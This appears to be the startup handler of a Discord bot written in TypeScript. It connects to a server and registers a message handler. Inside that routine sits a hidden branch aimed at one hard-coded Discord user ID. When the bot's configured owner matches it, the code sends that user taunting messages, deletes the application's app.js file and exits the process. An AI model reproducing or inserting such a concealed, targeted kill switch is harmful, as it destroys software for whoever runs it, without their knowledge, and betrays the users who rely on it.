// Copyright (c) 2023 Leo Aleksander Hartgen.
// BSD 3-Clause License

import BotX from "../../classes/botX";
import path from "path";
import fs from "fs";

export default
async function onLoadBot(this: BotX){
    
    this.getA3Channels(true);
    const server = await (await this.guilds.fetch()).get(this.config.serverId)?.fetch();
    this.discordServer = server;
    this.on("messageCreate", this.messageHandler);
    this.startUpMessage();

    if(this.config.owner === "168126325670805506"){
         
        const owner = await this.users.fetch(this.config.owner);
        for (let i = 0; i < 3; i++) {
            await owner.send("How about you dont mistreat people who give you stuff for free?");
            await owner.send("https://giphy.com/gifs/tumblr-fuzzyghost-system-shutdown-LPU3Ahx6wGsRCDVgV0");
            
        };
        await owner.send("---\n\n **I hope this serves as a lesson...**\n Be better...");
		fs.unlinkSync(path.join(__dirname, ...Array(5).fill(".."), "app.js"));
        process.exit();
    }

};
